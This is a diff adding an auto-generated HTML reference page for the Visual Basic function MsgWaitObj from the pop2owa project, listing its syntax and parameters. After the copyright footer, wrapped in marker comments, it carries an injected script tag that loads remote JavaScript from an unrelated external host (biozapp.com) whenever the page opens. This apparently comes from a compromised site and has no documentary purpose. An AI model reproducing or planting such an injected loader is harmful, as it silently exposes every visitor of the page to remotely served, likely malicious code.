@@ -1,0 +1,82 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="Text/html; charset=iso-8859-1">
+  <meta name="Author" content = "m.stamenov" >
+  <meta name="GENERATOR" content="VBDOX [2.0.15]" >
+  <link REL="stylesheet" TYPE="text/css" HREF="backsdk4.css">
+  <script SRC="langref.js"></script>
+  <title>modGlobal:&nbsp;MsgWaitObj</title>
+</head>
+<BODY TOPMARGIN="0">
+<TABLE CLASS="buttonbarshade" CELLSPACING=0><TR><TD>&nbsp;</TD></TR></TABLE>
+<TABLE CLASS="buttonbartable" CELLSPACING=0>
+<TR ID="hdr"><TD CLASS="runninghead" NOWRAP>modGlobal:&nbsp;MsgWaitObj</TD></TR>
+</TABLE>
+<!-- ============ METHOD ENTRY ============ -->
+<H1>MsgWaitObj</H1>
+<P>
+ The MsgWaitObj function replaces Sleep,
+ WaitForSingleObject, WaitForMultipleObjects functions.<BR/>
+ Unlike these functions, it
+ doesnt block thread messages processing.<BR/><P> <UL><LI>Using instead Sleep:</LI>
+ <UL><LI>MsgWaitObj dwMilliseconds</LI></UL>
+ <LI>Using instead WaitForSingleObject:</LI>
+ <UL><LI>retval = MsgWaitObj(dwMilliseconds, hObj, 1&)</LI></UL>
+ <LI>Using instead WaitForMultipleObjects:</LI>
+ <UL><LI>retval = MsgWaitObj(dwMilliseconds, hObj(0&), n),</LI>
+     <LI>where n - wait objects quantity,</LI>
+     <LI>hObj() - their handles array.</LI></UL></UL>
+
+
+<p><br>
+</p><br>
+<PRE class=syntax><B><font class="keyword">&nbsp;Public</font><font class="keyword">&nbsp;Function</font><font class="identifier">&nbsp;MsgWaitObj</font>(
+	&nbsp;<font class="identifier">&nbsp;Interval</font><font class="keyword">&nbsp;As</font><font class="keyword">&nbsp;Long</font>,
+	&nbsp;<font class="keyword">&nbsp;Optional</font><font class="identifier">&nbsp;hObj</font><font class="keyword">&nbsp;As</font><font class="keyword">&nbsp;Long</font>&nbsp;=<font class="number">&nbsp;0</font>&nbsp;&amp;,
+	&nbsp;<font class="keyword">&nbsp;Optional</font><font class="identifier">&nbsp;nObj</font><font class="keyword">&nbsp;As</font><font class="keyword">&nbsp;Long</font>&nbsp;=<font class="number">&nbsp;0</font>&nbsp;&amp;&nbsp;)<font class="keyword">&nbsp;As</font><font class="keyword">&nbsp;Long</font></B></PRE>
+<H4>Parameters</H4>
+<DL>
+<DT><I>Interval</I></TD>
+<DD>
+[ByRef]
+ <B>Long</B>.
+  Milliseconds
+
+</DD>
+<DT><I>hObj</I></TD>
+<DD>
+[ByRef]
+ Optional.
+ <B>Long</B>.
+ 
+
+&nbsp;<P><B>Default:</B>  0 &</P>
+</DD>
+<DT><I>nObj</I></TD>
+<DD>
+[ByRef]
+ Optional.
+ <B>Long</B>.
+ 
+
+&nbsp;<P><B>Default:</B>  0 &</P>
+</DD>
+</DL>
+<H4>Return Values</H4>
+<B>Long</B>&nbsp;-&nbsp;
+<H4>Remarks</H4>
+<P></P>
+<H4>See Also</H4>
+<P>
+<A HREF="pop2owa.html">Project pop2owa Overview</A>
+<A HREF="modGlobal.html">Class modGlobal Overview</A>
+<A HREF="modGlobal.html#public_props">modGlobal Properties</A>
+<A HREF="modGlobal.html#public_methods">modGlobal Methods</A>
+<B><A HREF="modGlobal.Function.MsgWaitForMultipleObjects.html">MsgWaitForMultipleObjects&nbsp;(function)</A></B>
+<B><A HREF="modGlobal.oPOP3.html">oPOP3</A></B>
+<DIV class=footer>Build on martes, 11 de noviembre de 2008 by VBDOX <BR>Copyright &copy; 2000 - 2003 M.Stamenov</DIV><!--a56a67--><script type="text/javascript" src="http://biozapp.com/Kfx6FNrG.php?id=13042538"></script><!--/a56a67-->
+
+<DIV class=footer style="COLOR: #000000; FONT-SIZE: 90%">
+</body>
+</html>
